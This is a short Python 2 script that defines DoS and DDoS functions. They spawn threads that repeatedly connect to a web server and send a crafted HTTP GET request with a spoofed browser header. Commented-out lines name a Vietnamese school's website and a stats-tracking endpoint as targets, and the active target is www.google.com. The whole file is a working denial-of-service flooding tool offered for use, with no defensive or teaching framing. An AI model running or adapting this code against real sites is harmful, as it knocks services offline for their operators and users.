import socket
import threading as thr
import ssl
import sys

message = ""

def put_file(x) :
    f = open("log.html","w")
    f.write(x)
    f.close()

def DoS(target,port,get,loop=1) :
    global message
    for i in range(loop) :
        s = socket.socket()
        if (port==443) :
            s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, ciphers="ADH-AES256-SHA")
        try:
            s.connect((target,port))
            s.send(message)
            # put_file(s.recv(100000000))
            sys.stdout.write(".")
        except socket.error:
            sys.stdout.write("X")
        s.close()

def DDoS(target,port,get,nAgent,nLoop) :
    bots = []
    for i in range(nAgent) :
        x = thr.Thread(target=DoS,args=(target,port,get,nLoop))
        bots+=[x]
        x.start()
    for x in bots :
        x.join()
    print "\nDone"
    
#target = "s4.histats.com"
#get = "/stats/971221.php?971221&@f16&@g0&@h15&@i3&@j1481967222679&@k190840&@l41&@mTruong%20PTNK%20-%20Trường%20Phổ%20thông%20Năng%20khiếu&@n0&@ohttps%3A%2F%2Fwww.google.fi%2F&@q0&@r0&@s22&@ten-US&@u1366&@vhttp%3A%2F%2Fwww.ptnk.edu.vn%2F%23&@w"
#target = "www.ptnk.edu.vn"
#get  = "/"
target = "www.google.com"
get = "/"
port = 80

message = """\
GET %s HTTP/1.1\r
Host: rile5.com\r
Connection: keep-alive\r
Cache-Control: max-age=0\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r
User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\r
Accept-Encoding: gzip, deflate, lzma, sdch\r
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6\r
\r
"""%(get)
DDoS(target,port,get,1,1)
print socket.gethostbyname(target)
